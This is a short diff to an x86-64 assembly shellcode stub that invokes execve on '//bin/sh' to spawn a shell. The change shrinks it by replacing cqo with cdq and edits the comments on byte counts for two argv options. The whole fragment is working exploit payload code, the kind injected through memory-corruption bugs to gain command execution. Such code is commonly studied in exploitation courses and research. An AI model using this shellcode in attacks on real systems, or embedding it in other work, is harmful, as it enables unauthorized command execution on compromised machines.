@@ -7,16 +7,15 @@ _start:
 	push $59			 # sys_execve
 	pop %rax
 
-	cqo				 # env = NULL
-
+	cdq				 # env = NULL
 	push %rdx			 # null-terminator byte(s)
 	movabs $0x68732f6e69622f2f, %rdi # '//bin/sh'
 	push %rdi			 #
 	mov %rsp, %rdi			 # "//bin/sh" address
 
-# Option 1: argv = NULL (3 bytes long) #
+# Option 1: argv = NULL #
 	mov %rdx, %rsi
-# Option 2: argv = ["/bin/sh", NULL] (5 bytes long) #
+# Option 2: argv = ["/bin/sh", NULL] (+ 2 bytes) #
 #	push %rdx
 #	push %rdi
 #	mov %rsp, %rsi
